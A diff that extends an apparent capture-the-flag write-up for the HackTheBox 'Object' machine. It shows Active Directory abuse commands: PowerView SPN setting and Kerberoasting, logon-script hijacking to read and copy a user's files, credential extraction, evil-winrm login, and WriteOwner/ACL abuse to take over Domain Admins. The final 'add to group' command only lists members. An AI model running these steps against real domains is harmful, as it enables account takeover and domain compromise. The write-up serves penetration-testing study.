@@ -303,12 +303,135 @@ Authenticating:
 evil-winrm -i object.htb -u smith
 ```
 
-<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 Step 2: <mark style="color:red;">GenericWrite Smith -> Maria</mark>
+
+* Followed the example found in BloodHound help for GenericWrite
+
+```
+Set-DomainObject -Identity maria -SET @{serviceprincipalname='nonexistent/UWU'}
+```
+
+* Then tried to make the user acocunt a SPN to get a TGS ticket
+
+Invoking Kerberoast with PowerView:
+
+{% code overflow="wrap" %}
+```
+Invoke-Kerberoast
+Warning: [Get-DomainSPNTicket] Error requesting ticket for SPN 'nonexistent/UWU' from user 'CN=maria garcia,CN=Users,DC=object,DC=local' : Exception calling ".ctor" with "1" argument(s): "The NetworkCredentials provided were unable to create a Kerberos credential, see inner exception for details."
+```
+{% endcode %}
+
+* Unfortunately it did not work
+
+I also tried to use the logonscript.ps1 found in BloodHound and using PowerView, we can use the following:
+
+Creating file marialogonscript.ps1:
+
+```
+echo 'cmd /c "dir > C:\Programdata\output.txt"' > marialogonscript.ps1
+```
+
+Contents of marialogonscript.ps1:
+
+```
+cmd /c "dir > C:\Programdata\output.txt"
+```
+
+```
+Set-DomainObject -Identity maria -SET @{scriptpath="C:\\Programdata\marialogonscript.ps1"}
+```
+
+I then waited for the Maria user to login
+
+We then see an output.txt and notice that we get the system32 directory. However, we want her Desktop:
+
+Modifying marialogonscript.ps1:
+
+```
+C:\Programdata> echo 'cmd /c "dir C:\Users\maria\Desktop > C:\Programdata\dirout.txt"' > marialogonscript.ps1
+```
+
+We then wait for her to login again:
+
+I see an Engines.xls
+
+Copy Engines.xls to Programdata:
+
+```
+echo 'cmd /c "copy C:\Users\maria\Desktop\Engines.xls C:\Programdata\Engines.xls"' > marialogonscript.ps1
+```
+
+Download Engines.xls to Kali from Evil-WinRM:
+
+```
+download C:\Programdata\Engines.xls
+```
+
+Using LibreOffice:
+
+<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
+We can do the same by running strings:
+
+```
+strings C:\Programdata\Engines.xls
+
+maria
+W3llcr4ft3d_4cls
+d34gb8@
+0de_434_d545
+```
+
+I will then place these passwords into EvilWinRM to see which one works:
+
+```
+evil-winrm -i object.htb -u maria -p 'W3llcr4ft3d_4cls'
+```
+
+We are now Maria:
+
+<figure><img src="../../../.gitbook/assets/image (43).png" alt=""><figcaption></figcaption></figure>
+
+Step 3: <mark style="color:red;">Maria (WriteOwner) -> Domain Admins Group</mark>
+
+```
+Set-DomainObjectOwner -Identity "Domain Admins" -OwnerIdentity maria
+```
+
+* <mark style="color:yellow;">This was referenced from BloodHound's WriteOwner Abuse Tab</mark>
+
+```
+Add-DomainObjectAcl -TargetIdentity "Domain Admins" -Right
+s WriteMembers
+```
+
+```
+Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity Maria -Rights WriteMembers
+```
+
+Granting Rights All:
+
+```
+Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity Maria -Rights All
+```
+
+Add Maria to "Domain Admins" group:
+
+```
+net group "Domain Admins" /domain
+```
+
+<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+
+We are now in the Domain Admins group
 
 
 
 ### PrivEsc vector
+
+
 
 ## Proofs
